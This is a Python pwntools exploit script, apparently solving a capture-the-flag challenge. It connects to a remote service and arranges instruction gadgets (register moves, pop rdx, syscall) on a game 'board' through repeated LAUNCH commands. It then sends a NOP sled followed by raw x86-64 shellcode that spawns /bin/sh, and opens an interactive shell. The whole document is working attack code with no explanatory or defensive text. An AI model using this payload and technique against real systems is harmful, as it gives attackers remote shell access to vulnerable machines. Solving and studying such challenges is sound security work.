import argparse
import codecs
import leb128
import math
import threading
import traceback

from pwn import *

# context.log_level = 'debug'
context.log_level = 'error'
context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

# r = process(['./challenge'])
# gdb.attach(r, f'''
# # b *main+0x1ce
# c
# ''')

"""
# find instructions
#

import binaryninja

instrs = []

max = bv.arch.max_instr_length
for i in range(len(bv) - max):
	bytes = bv[i:i+max]
	disasm = bv.arch.get_instruction_text(bytes, i)
	if disasm[1] == 0:
		continue
	instrs.append((''.join(t.text for t in disasm[0]), i))
	# print((i, disasm))


instrs.sort(key=lambda foo: foo[0])

show_plain_text_report("Instructions", '\n'.join(f'0x{i[1]:04x} # --> {i[0]}' for i in instrs))

# print(instrs)

"""



r.recvuntil(b"> ")

board = [0] * 0x1000

# for i in range(0x100):
#     line = r.recvline().strip()
#     bs = [int(foo.decode(), base=16) for foo in line.split(b" ")]
#     board.extend(bs)

# print(''.join(f'{b:02x}' for b in board))

# shits in rdx, need to get it into rsi

# rax = 0 ; initial state
# rdi = 0
# rsi = initial rdx
# rdx = <something medium sized>

saved = [
# rsi = rdx
0x0059, # --> push    rdx
0x00c4, # --> pop     rsi

# rdi = 0
0x02f0, # --> mov     edi, ebx
0x02f1,

# rdx = 0xffff
0x0257, # --> pop     rdx
0x0321, # --> pop     rdx
0x03a2, # --> or      dl, ch
0x03a3,
0x0508, # --> xor     dh, ch
0x0509,

0x0c27, # --> syscall
0x0c28,
]


def xy2board(x, y):
    return x + y * 16

def board2xy(board):
    return (board % 16, board // 16)

def affects(x, y):
    yield xy2board(x, y)
    if x > 0:
        yield xy2board(x - 1, y)
    if x < 15:
        yield xy2board(x + 1, y)
    if y > 0:
        yield xy2board(x, y - 1)
    if y < 0xff:
        yield xy2board(x, y + 1)


print("got board")

for pos in range(0x1000):
    x, y = board2xy(pos)

    if any(a in saved for a in affects(x, y)):
        continue

    for a in affects(x, y):
        board[a] = 0x90


print(board)


for pos in range(0x1000):
    x, y = board2xy(pos)

    if any(a in saved for a in affects(x, y)):
        continue

    r.sendline(f"LAUNCH {x},{y}")
    print(f"==> {x},{y}")
    # r.recvuntil(b"> ")


r.sendline(f"ENDTEST")

sc = b'\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendline(b'\x90' * 0xc30 + sc)


r.interactive()
